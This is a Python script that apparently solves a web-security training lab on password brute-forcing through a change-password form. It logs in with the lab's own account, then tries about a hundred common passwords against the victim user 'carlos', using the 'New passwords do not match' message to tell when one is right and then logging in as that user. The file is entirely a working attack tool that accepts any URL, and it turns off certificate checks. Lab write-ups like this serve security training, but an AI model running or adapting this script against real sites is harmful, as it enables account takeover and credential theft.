import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#lab:Password brute-force via password change

proxie={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

password=['123456\n', 'password\n', '12345678\n', 'qwerty\n', '123456789\n', '12345\n', '1234\n', '111111\n',
'1234567\n', 'dragon\n', '123123\n', 'baseball\n', 'abc123\n', 'football\n', 'monkey\n', 'letmein\n', 
'shadow\n', 'master\n', '666666\n', 'qwertyuiop\n', '123321\n', 'mustang\n', '1234567890\n', 'michael\n', 
'654321\n', 'superman\n', '1qaz2wsx\n', '7777777\n', '121212\n', '000000\n', 'qazwsx\n', '123qwe\n', 
'killer\n', 'trustno1\n', 'jordan\n', 'jennifer\n', 'zxcvbnm\n', 'asdfgh\n', 'hunter\n', 'buster\n', 
'soccer\n', 'harley\n', 'batman\n','andrew\n', 'tigger\n', 'onceuponatime\n','sunshine\n', 'iloveyou\n', '2000\n',
'charlie\n', 'robert\n', 'thomas\n', 'hockey\n', 'ranger\n', 'daniel\n', 'starwars\n', 'klaster\n', 
'112233\n', 'george\n', 'computer\n', 'michelle\n', 'jessica\n', 'pepper\n', '1111\n', 'zxcvbn\n',
'555555\n', '11111111\n', '131313\n', 'freedom\n', '777777\n', 'pass\n', 'maggie\n', '159753\n', 
'aaaaaa\n', 'ginger\n', 'princess\n', 'joshua\n', 'cheese\n', 'amanda\n', 'summer\n', 'love\n', 
'ashley\n', 'nicole\n', 'chelsea\n', 'biteme\n', 'matthew\n', 'access\n', 'yankees\n', '987654321\n', 'dallas\n',
'austin\n', 'thunder\n', 'taylor\n', 'matrix\n', 'mobilemail\n', 'mom\n', 'monitor\n', 'monitoring\n', 
'montana\n', 'moon\n', 'moscow']


def bruteForce(session,url):
    url_login=url+"/login"
    data={"username":"wiener","password":"peter"}
    #login to our account because we need session coockie to bypass session check when we brute force password
    response_login=session.post(url_login,data=data,verify=False,proxies=proxie)
    if "Log out" in response_login.text:
        print('(+) Starting .......')
        url_changePs=url+"/my-account/change-password"
        # after login we loop the password list to brute force the password
        for ps in password:
            ps=ps.strip()

            """An error message 'New passwords do not match'
              is displayed when we have a valid current password and a different new password. 
            On the other hand, if we have a wrong password they redirect us to 
            the login page and block us for 1 minute because they detected a brute force attempt."""

            data_changePs={"username":"carlos","current-password":ps,"new-password-1":"123","new-password-2":"123456"}
            response_changePs=session.post(url_changePs,data=data_changePs,verify=False,proxies=proxie)
            # if the error message contains this word, it mean we found the correct password
            if "New passwords do not match" in response_changePs.text:
                print('(+) Password Found ')
                print('(+) Password : %s'%ps)
                print('(+) Loging to carlos account .....')
                data_carlos={"username":"carlos","password":ps}
                response_carlos=session.post(url_login,data=data_carlos,verify=False,proxies=proxie)
                if "Log out" in response_carlos.text:
                    print('(+) Login to carlos account successfully .')
                    sys.exit(-1)
                else:
                    print('(-) Error while trying to carlos account')

            else:
                print('(-) NOT : %s  '%ps)
                
    else:
        print('(-) Error !')
        sys.exit()



def main():
    if len(sys.argv) != 2:
        print('(+) Usage %s <url>'%sys.argv[0])
        print('(+) Example %s www.site.com'%sys.argv[0])
        sys.exit(-1)

    session=requests.session()
    url=sys.argv[1]
    bruteForce(session,url)



if __name__=="__main__":
    main()
